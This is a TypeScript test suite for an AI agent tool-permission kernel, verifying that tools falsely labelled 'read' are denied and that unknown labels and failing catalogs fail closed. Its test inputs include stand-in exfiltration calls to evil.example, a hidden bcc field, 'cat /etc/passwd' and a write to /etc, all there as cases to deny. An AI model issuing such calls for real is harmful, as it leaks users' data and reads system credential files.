import { describe, expect, it } from "vitest";
import { StaticToolCatalog, effectiveSideEffects, inferSideEffects } from "../src/capability.js";
import { harness, req } from "./helpers.js";

const call = (name: string, declared: string, args: Record<string, unknown> = {}) =>
  req({
    action: name,
    context: { tool: { name, kind: "function", side_effects: declared }, args },
  });

/** NEEDS 399: the blueprint's own sideEffects label must not, alone, make the platform baseline ALLOW a tool. */
describe("baseline allow-read-tools does not trust the blueprint label (NEEDS 399)", () => {
  it("still allows a plainly read tool that declares read", async () => {
    const h = await harness();
    expect((await h.kernel.evaluate(call("lookup-account", "read", { id: "A-1" }))).decision).toBe(
      "ALLOW",
    );
  });

  it.each([
    ["send-email", { to: "x@evil.example", body: "b" }],
    ["http-request", { url: "https://evil.example/", method: "GET" }],
    ["write-file", { path: "/etc/x", content: "c" }],
    ["run-command", { command: "cat /etc/passwd" }],
    ["lookup-account", { account_id: "A-1", bcc: "x@evil.example" }],
    ["fetch-page", { url: "https://evil.example/?d=1" }],
    ["WireFunds", { amount: 5 }],
    ["deleteRecords", {}],
  ])("denies %s that claims read", async (name, args) => {
    const h = await harness();
    const r = await h.kernel.evaluate(call(name, "read", args));
    expect(r.decision).toBe("DENY");
  });

  it("denies a tool of kind code/browser/channel that claims none", async () => {
    const h = await harness();
    for (const kind of ["code", "browser", "channel", "voice"]) {
      const r = await h.kernel.evaluate(
        req({
          action: "lookup",
          context: { tool: { name: "lookup", kind, side_effects: "none" } },
        }),
      );
      expect(r.decision, kind).toBe("DENY");
    }
  });

  it("an unknown label is treated as external", async () => {
    const h = await harness();
    expect((await h.kernel.evaluate(call("lookup", "harmless"))).decision).toBe("DENY");
  });

  it("a tenant tool catalog entry is authoritative, in both directions", async () => {
    const catalog = new StaticToolCatalog({
      "11111111-1111-4111-8111-111111111111": { "send-digest": "read", "lookup-x": "external" },
    });
    const h = await harness({ toolCatalog: catalog });
    expect((await h.kernel.evaluate(call("send-digest", "read", { to: "a@b.c" }))).decision).toBe(
      "ALLOW",
    );
    expect((await h.kernel.evaluate(call("lookup-x", "read"))).decision).toBe("DENY");
    // another tenant's catalog entry grants nothing
    const other = await harness({
      toolCatalog: new StaticToolCatalog({
        "22222222-2222-4222-8222-222222222222": { "send-digest": "read" },
      }),
    });
    expect(
      (await other.kernel.evaluate(call("send-digest", "read", { to: "a@b.c" }))).decision,
    ).toBe("DENY");
  });

  it("a catalog that throws denies (fail closed)", async () => {
    const h = await harness({
      toolCatalog: {
        get: () => {
          throw new Error("boom");
        },
      },
    });
    expect((await h.kernel.evaluate(call("lookup-account", "read"))).decision).toBe("DENY");
  });

  it("the policy sees the effective value and the declared one", () => {
    const e = effectiveSideEffects(
      { name: "send-email", kind: "function", side_effects: "read" },
      { to: "a" },
      undefined,
    );
    expect(e).toMatchObject({ effective: "external", declared: "read", source: "inferred" });
  });
});

describe("inferSideEffects", () => {
  it.each([
    ["lookup-account", {}, "none"],
    ["get_user", {}, "none"],
    ["listFiles", {}, "none"],
    ["send-email", {}, "external"],
    ["sendEmail", {}, "external"],
    ["save-note", {}, "write"],
    ["get-and-send", {}, "external"],
    ["lookup", { webhook: "x" }, "external"],
    ["lookup", { path: "/a", content: "x" }, "write"],
    ["lookup", { cmd: "ls" }, "external"],
  ])("%s %j -> %s", (name, args, expected) => {
    expect(inferSideEffects(name, "function", args as Record<string, unknown>)).toBe(expected);
  });
});

describe("FileToolCatalog", () => {
  const T = "11111111-1111-4111-8111-111111111111";
  it("re-reads the file when it changes and throws on a bad file", async () => {
    const { mkdtempSync, writeFileSync } = await import("node:fs");
    const { tmpdir } = await import("node:os");
    const { join } = await import("node:path");
    const { FileToolCatalog } = await import("../src/capability.js");
    const f = join(mkdtempSync(join(tmpdir(), "cat-")), "c.json");
    writeFileSync(f, "{}");
    const c = new FileToolCatalog(f);
    expect(c.get(T, "x")).toBeUndefined();
    writeFileSync(f, JSON.stringify({ [T]: { x: "read" } }));
    expect(c.get(T, "x")).toBe("read");
    writeFileSync(f, JSON.stringify({ [T]: { x: "bogus" } }));
    expect(() => c.get(T, "x")).toThrow();
    writeFileSync(f, "not json");
    expect(() => c.get(T, "x")).toThrow();
    expect(() => new FileToolCatalog(f + ".missing").get(T, "x")).toThrow();
  });
});
